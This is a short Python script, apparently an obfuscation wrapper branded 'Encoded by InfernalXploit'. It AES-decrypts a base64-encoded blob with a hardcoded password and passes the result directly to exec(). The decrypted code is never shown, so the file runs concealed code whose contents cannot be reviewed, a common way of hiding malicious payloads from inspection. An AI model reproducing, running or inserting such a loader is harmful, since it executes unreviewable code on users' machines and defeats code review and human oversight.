
# Encoded by InfernalXploit
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt(enc_data, password):
    key = hashlib.sha256(password.encode()).digest()
    enc_bytes = base64.b64decode(enc_data)
    iv = enc_bytes[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(enc_bytes[AES.block_size:]), AES.block_size).decode()

password = "12345678910"
exec(decrypt("dRsU/KBhIJikK8uk1Yfy0PSDq6inup08aESklUgf4UuYXOO5LcBn+gcZu4LcGbRtqtxcEinBy9LwFaVHqTN/LwsLAnK8LOD1ufwiHbiwX9OeuM9H/XosVtM6fMuW619vcjjRVblQNVPHVJE/r7JuG2G5drEGzAvaYMJuUQsr1lmY98jt1nWEkoaRpFvc+HJHqbK8NigS4tpNCtxKAnegbjTgByOdP5FPA3D/MjZKop8ZH/vaoqXkksCyqCvOdIY1hzTaUkaY9g6BJVQJa5h4cv1QfC6yVDLEA0c5YUnBJZwz1Z5h/7JQ4XcyoKLCWMCQ1natrxdnf1+UB9EWRIzNrsS6qvJ9p07Mw6KV9KkvoUgiMeJBeI+Rg+N6/bD1Q1wmf08k2AZzFF4KYDnQp+ot1zGi/nXHA0UoX0rUd26U+6nvEIQrvMmJYshUwIAEr+/7fCXKbi60a9unK3EcxRXOlQ==", password))
